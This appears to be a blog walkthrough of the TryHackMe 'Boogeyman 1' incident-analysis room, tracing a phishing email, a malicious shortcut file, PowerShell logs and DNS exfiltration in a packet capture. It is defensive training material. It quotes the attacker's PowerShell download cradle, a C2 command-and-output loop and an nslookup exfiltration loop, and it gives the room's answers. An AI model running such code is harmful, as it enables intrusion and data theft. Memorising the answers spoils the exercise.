---
title: "Boogeyman 1 - TryHackMe Write-up"
seoTitle: "Boogeyman 1 - TryHackMe Write-up"
seoDescription: "Study the "Boogeyman" threat: initial access, phishing emails, encoded payloads, C2 communications, and exfiltration tactics"
datePublished: Wed Aug 20 2025 14:41:50 GMT+0000 (Coordinated Universal Time)
cuid: cmek2zosy000302lhfwbthgfc
slug: boogeyman-1-tryhackme-write-up
canonical: https://forrestcaffray.com/boogeyman-1-tryhackme-write-up-8448a39e9543
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1755601443596/2dd790a9-d45d-4489-a5ac-baab4ea3e8d3.png
tags: cybersecurity, cybersecurity-1, tryhackme, cybersec, tryhackme-walkthrough, tryhackmewalkthrough

---

Link to room: [https://tryhackme.com/room/boogeyman1](https://tryhackme.com/room/boogeyman1)

*Uncover the secrets of the new emerging threat, the Boogeyman.*

In this room, you will be tasked to analyse the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective.

---

> ### What is the email address used to send the phishing email?

![Screenshot of an email from Arthur Griffin to Julianne Westcott regarding a payment reminder for document #39586972 due on January 20, 2023. The subject is "Collection for Quick Logistics LLC - Jan 2023". A code "Invoice2023!" is provided for accessing an encrypted file. A privacy warning about blocked remote content is present.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755602273242/c1c5bf57-dfef-4857-8134-87b93311e49b.png align="center")

We want to open the email in **Thunderbird Email** that’s located in the **Artefacts** folder on the **Desktop.**

We can now see some of the headers for email like the **From** header.

**Answer: agriffin@bpakcaging.xyz**

---

> ### What is the email address of the victim?

Looking at headers again we can see the **To** header.

**Answer: julianne.westcott@hotmail.com**

---

> ### What is the name of the third-party mail relay service used by the attacker based on the **DKIM-Signature** and **List-Unsubscribe** headers?

We can either upload this .eml file to an email analyser or just look at the source ourselves.

![Screenshot of Mozilla Thunderbird's interface showing the top menu bar. A dropdown menu is open with options like "Redirect," "Tag," and "View Source" on display.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755602795908/d0800c22-7da7-4ff4-90a7-be336baeda13.png align="center")

I did a quick **CTRL-F** to look for the **DKIM-Signature** and found this.

![A screenshot showing an email message to "Julianne" from "Arthur Griffin" of B Packaging Inc., expressing a request for confirmation and mentioning an attachment. The right side displays a DKIM signature and email headers, with terms like "Received-SPF" and "DKIM-Signature" visible. Thunderbird's privacy notice is at the top.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755602985472/2238bce0-707c-4dc1-9297-ba19ae786355.png align="center")

We can see the **DKIM-Signature** section with **d=elasticmail.com**.

**Answer: elasticmail.com**

---

> ### What is the name of the file inside the encrypted attachment?

We can save the **attached file** in the email into the **Artefacts** folder.

![An email with an attachment named "Invoice.zip." The cursor is selecting "Save As..." from a menu. The email is signed by a "Collections Officer" from "B Packaging Inc."](https://cdn.hashnode.com/res/hashnode/image/upload/v1755603219150/5474c01a-4073-4ab5-b691-07d41937b28f.png align="center")

Let’s then extract the file inside, we will be prompted for the password which we already know by reading the email. It’s referred to as “code”.

We can see the name of the compressed file both before and after we extract it.

**Answer: Invoice\_20230103.lnk**

---

> ### What is the password of the encrypted attachment?

Looking at email above we know this.

**Answer: Invoice2023!**

---

> ### Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

Let’s open **terminal** inside the directory we are currently in (**Artefacts**).

Then as with the instructions.

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">Always read the instructions of each exercise thoroughly!</div>
</div>

We want to use **lnkparse** on the **.lnk file** from the email.

`lnkparse Invoice_20230103.lnk`

We will find something interesting:

```bash
Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

Looks like a juicy **base64** encoded string to me.

**Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==**

---

> ### What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. [a.domain.com](http://a.domain.com),[b.domain.com](http://b.domain.com))

We have an encoded string, we have to decode it!

Head over to [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/) and get going. We can paste the **base64** encoded string into the Input and use the **From Base64** Recipe, along with **Remove null bytes** to produce a cleaner result.

This is what we get:

```bash
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

Take note of the URL: `files.bpakcaging.xyz`

Let’s have a look at the **powershell.json** file now. With the instructions given we are going to use **jq.**

We can run:

```bash
cat powershell.json | jq '.ScriptBlockText'
```

Which gives us a good start, we can snoop around for domains and URL’s in there.

With the information we already have I decided to narrow this down to having a look specifically for related domains using **.xyz**.

```bash
cat powershell.json | jq '.ScriptBlockText' | grep .xyz
```

Same command but we can **grep** out **.xyz**.

We get something that looks like this:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell.json | jq '.ScriptBlockText' | grep .xyz
"$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n"
"iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')"
"iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd"
"iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd"
"$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";;pwd"
```

We can see the `files.bpakcaging.xyz` subdomain as well as `cdn.bpakcaging.xyz`.

Suggesting one server for **files** and another for **content delivery network.**

**Answer: cdn.bpakcaging.xyz,files.bpakcaging.xyz**

---

> ### What is the name of the enumeration tool downloaded by the attacker?

Lets have a look at that **powershell** file using **jq**.

```bash
cat powershell.json | jq '.ScriptBlockText'
```

Right at the beginning of the log we find this:

```bash
"iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd"
```

We see an **Invoke-Expression** downloading something called **Invoke-Seatbelt.ps1** which sounds a bit dodgy.

We can go look at the **github** location to see what it does.

**Answer: seatbelt**

---

> ### What is the file accessed by the attacker using the downloaded **sq3.exe** binary? Provide the full file path with escaped backslashes.

We know about the **sq3.exe** so let’s start with that.

I did a:

```bash
cat powershell.json | jq '.ScriptBlockText' | grep sq3.exe
```

This part caught my eye:

```bash
".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";pwd"
```

I think we are looking at the **plum.sqlite** file.

The file path isn’t complete with it starting from the **AppData** location.

To find the rest I decided to use **grep** to look for **Users**

```bash
cat powershell.json | jq '.ScriptBlockText' | grep Users
```

I found this:

```bash
"ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd"
```

Look juicy but lets keep on track.

We can combine these results since we now know about **j.westcott**.

**\= C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes\_8wekyb3d8bbwe\\LocalState\\plum.sqlite**

---

> ### What is the software that uses the file in Q3?

When we previously used **grep** to look for **sq3.exe** we noted a response above. Looking at that result we can see what software we are looking for.

**Answer: Microsoft Sticky Notes**

---

> ### What is the name of the exfiltrated file?

So we kinda accidentally found this earlier.

We can use as our base:

```bash
cat powershell.json | jq '.ScriptBlockText'
```

then we can `| grep ‘C:\\’` or `| grep Users` or `| grep Documents` and we will find the same file.

**\= protected\_data.kdbx**

---

> ### What type of file uses the .kdbx file extension?

A wee Google for **.kdbx file** will do it.

**Answer: keepass**

---

> ### What is the encoding used during the exfiltration attempt of the sensitive file?

For this I wanted to look at our previous results using:

```bash
cat powershell.json | jq '.ScriptBlockText'
```

I scrolled up a bit and found where we found our previous result:

```bash
$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
```

Looking just above that we find:

```bash
$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";;pwd
```

and

```bash
$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd
```

We can see what appears to be some kind of splitting action into **hex**.

**Answer: hex**

---

> ### What is the tool used for exfiltration?

Looking at everything we have so far we need to be looking at the **hex** results:

```bash
$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";;pwd
```

It looks to me like information is being split into stacks of 50 characters (for **DNS** ex filtration 50 is a safe amount - 63 is max) and then being pushed out as **DNS** queries using **nslookup.**

**Answer: nslookup**

---

> ### What software is used by the attacker to host its presumed file/payload server?

Let’s open the **capture.pcapng** file, it will open in **Wireshark** by default.

We already looked at and know about **cdn.bpakcaging.xyz** and **files.bpakcaging.xyz.**

The **files.bpakcaging.xyz** domain seems to me like the one we need to look at first.

I used this as a place to start when filtering with **Wireshark**:

![A screenshot of a packet analysis tool showing network traffic details. The table displays columns such as No., Time, Source, Destination, Protocol, Length, and Info. The HTTP traffic includes requests and responses, with some highlighted source and destination IP addresses.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755624101413/9dbe2fe3-e9cb-4760-956f-e2b04ac59cca.png align="center")

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">A good idea is to “bookmark” this search, hit that wee icon to left, give it a name. Hit it again to use this search. I created one for <strong>files.bpakcaging.xyz</strong> and <strong>cdn.bpakcaging.xyz.</strong></div>
</div>

I then followed the **TCP Stream** of **sq3.exe** as we already know about this binary.

The start of the result looks like:

![Screenshot of HTTP response headers and hex dump for an executable file named "sq3.exe". Details include user agent information, server type, content type, file size, and last modified date. Hex dump shows "MZ" and a DOS mode error message.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755624232690/c5958227-27ee-4736-b5be-c637c9575f4d.png align="center")

We can see `Server: SimpleHTTP/0.6 Python/3.10.7`.

**Answer: Python**

---

> ### What HTTP method is used by the C2 for the output of the commands executed by the attacker?

If we look at the **http** traffic going to the **C2** which I would guess is **cdn.bpakcaging.xyz.**

![A Wireshark network analysis screenshot displaying captured HTTP packets. The list shows packet details such as number, time, source, destination, protocol, length, and info. One packet is highlighted, with additional detailed data displayed below, including Ethernet, IP, and TCP headers.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755624661520/64db6a7a-e253-4dcd-9a41-2e684b5919fd.png align="center")

There are a bunch of GET requests, but if we look at one of the POST requests, we can see a section in Wireshark `HTML Form URL Encoded: application/x-www-form-urlencoded`

We see **decimal** encoded traffic.

**Answer: POST**

---

> ### What is the protocol used during the exfiltration activity?

With all previous information about **nslookup** and how the information is split up in to **hex** chunks, we know what protocol is being used here.

**Answer: DNS**

---

> ### What is the password of the exfiltrated file?

OK this one needs a bit of thought.

We have chunks of **decimal** encoded strings.

We can use:

```plaintext
http contains "cdn.bpakcaging.xyz" and http.request.method == "POST"
```

This filters for the **C2** machine and filters for **POST** requests.

Now we have a fair bit of traffic and the smart thing would be write a fancy bit of code for Tshark and take all **form** traffic in **decimal** and combine it all together in one go.

I decided to go full manual to see how painful it might be.

It wasn’t too bad and I didn’t need to fiddle with fancy commands.

Let’s walk through it.

I clicked on the first packet and followed the **TCP Stream**.

![A screenshot of a packet analyzer interface showing network traffic details. The main window displays columns such as No., Time, Source, Destination, Protocol, Length, and Info. An active right-click context menu shows options like Mark/Unmark Packet, Apply as Filter, and Follow, with TCP Stream highlighted. The bottom panel displays technical details of a selected packet.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755685126661/dd22e234-94a2-48f3-b4c2-37413e6913dd.png align="center")

I would then copy the decimal section.

![Screenshot of a Wireshark session showing HTTP packet details. The interface displays hexadecimal data, source and destination IP addresses, and protocol information. The highlighted section provides HTTP headers, including user-agent and server details.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755685181940/3956cc69-beaf-44ae-b398-712f5e6f7b8f.png align="center")

Paste that into CyberChef:

![Screenshot of a text decoding tool interface. On the left, a list of operations like "From Modhex" and "From Morse Code." In the center, a "From Decimal" option with the delimiter set to "Space." The right shows input as decimal numbers and output text including a file path "C:indowsystem32."](https://cdn.hashnode.com/res/hashnode/image/upload/v1755685223312/239b75fa-53b1-43bb-a937-a093e7375082.png align="center")

Then once I am done it found it faster to just click the **Back** button at the bottom of the Wireshark window, **mark** (Ctrl+M) the packet I’ve inspected and move on to the next one.

Not fancy or glamorous but I did get to the packet I needed. If it was bigger I would look into booting up Tshark.

I eventually found packet **44467**:

![Screenshot of a Wireshark application window showing a TCP stream. The window is split into sections displaying packet details, data in hexadecimal format, and decoded contents including a HTTP POST request and server response. The background shows packet list and details in tabs.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755685432484/f3ee3800-8058-4e39-9b15-bcd424b90064.png align="center")

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">Leaving a comment on interesting packets like this one is a good idea: <strong>right click</strong> &gt; <strong>Packet Comment… </strong>(Ctrl+Alt+C). Then on the middle pane you can right click the <strong>Packet comments</strong> section and <strong>Apply as Column</strong> (Ctrl+Shift+I) for easier viewing.</div>
</div>

Decoded in CyberChef:

![User interface of a conversion tool, with an "Input" section showing numbers and an "Output" section displaying decoded text including a password.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755685497402/2a76aa39-1e11-484e-aede-a78953e92af6.png align="center")

I had a wee filter in CyberChef looking for <mark>password</mark> which highlighted this nicely.

Just under the highlighted <mark>password</mark> you can see the actual password.

**Answer: %p9^3!lL^Mz47E2GaT^y**

---

> ### What is the credit card number stored inside the exfiltrated file?

Here’s the **THM** hint: *“Retrieve the exfiltrated file first using Tshark and focus on the query type used shown in the PowerShell logs.”*

Well, so much for not using **Tshark**.

Here we go!

Opening **Tshark** in the location where the **.pcap** file is:

```bash
tshark -r capture.pcapng -n -T fields -e dns.qry.name | grep "bpakcaging.xyz" | cut -f 1 -d "." | uniq -c > exfiltrated_file.txt
```

Open the file and manually remove the extra bits until you have a clean file that just has the **hex** information.

Then:

```bash
cat exfiltrated_file.txt | tr -d '\n' > file
```

Open this file and paste it into CyberChef:

![Screenshot of CyberChef interface with operations menu on the left, input and output sections on the right. The input contains hexadecimal data, which is decoded into garbled characters in the output section using the "From Hex" operation. The interface includes options for encoding and decoding various formats.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755689173557/664257a8-d4f1-4532-8be8-113f92067737.png align="center")

Save the file as **exfiltrated\_file.kdbx**:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755689238027/79c99cd4-b1d7-455e-9198-95004e8b25d5.png align="center")

Open the file, it will automatically open in **keepass.**

Use the **password** from the previous question to open the file.

This will grant you access:

![A password management software interface displaying a folder named "protected_data" with various categories like General, Windows, and Homebanking. The Homebanking section is open, showing an entry titled "Company Card" with obscured password details and additional information about an account, including the account number and expiration date.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755689394420/0e26bd32-4ff7-479c-a96a-8d046e1c3e90.png align="center")

You can see the **Account Number** at the bottom.

**Notes:** The machine we are working with on **THM** I don’t think has internet access. So trying to get the **hex** value file into **CyberChef** and then back into the machine to open in **keepass** might be tricky. I booted up the AttackBox and used that for CyberChef instead.

I used:

```bash
python3 -m http.server
```

In the **artefacts** folder on the machine.

I used:

```bash
ip a
```

To find it’s **IP Address.**

Then on the **AttackBox** I would to make sure I can reach the machine:

```bash
ping <IP>
```

Open Firefox, type in the **IP** and add the port which is typically **8000**.

![Screenshot of a webpage showing a directory listing with files and folders: capture.pcapng, dump.eml, evt2json/, file, powershell.evtx, powershell.json, and sensitive_file.txt.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755689818460/76f2986e-d62d-456a-8eaf-4e8bb35ed98f.png align="center")

Download the **file**. Copy that into **CyberChef**, decode, download and reverse the above process to then download it to the **machine**. I hope that makes sense. I am 100% sure there is a more elegant way of doing this. Another idea is **SAMBA**, or perhaps just using **CyberChef** and **Keepass** on your own **VM** or **machine**.

For more information on this last step I found this blog post incredible helpful and I couldn’t have done it without the help: [https://beginninghacking.net/2023/04/16/try-hack-me-boogeyman-1-blueteam/](https://beginninghacking.net/2023/04/16/try-hack-me-boogeyman-1-blueteam/) by **lightkunyagami**.

I am not sure what the blog etiquette is here but for this last step, that’s the post you wanna look at.

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">For these <strong>Tshark</strong> commands I find copying them and then pasting them into <strong>AI</strong> like <strong>ChatGPT</strong> helps a lot as they dismantle and describe commands nicely. I would do this for every command that seems confusing. Oh and don’t forget the <strong>man</strong> command to have a look at the manual. <strong>-h</strong> also helpful (lol).</div>
</div>

**Answer: 4024007128269551**

---

Hopefully this helped you! I found it definitely got a bit tricky near the end but with some Googling and AI, we can work through it. Making sure we understand each step. If you haven’t done Boogeyman 2 yet, let’s get started with it!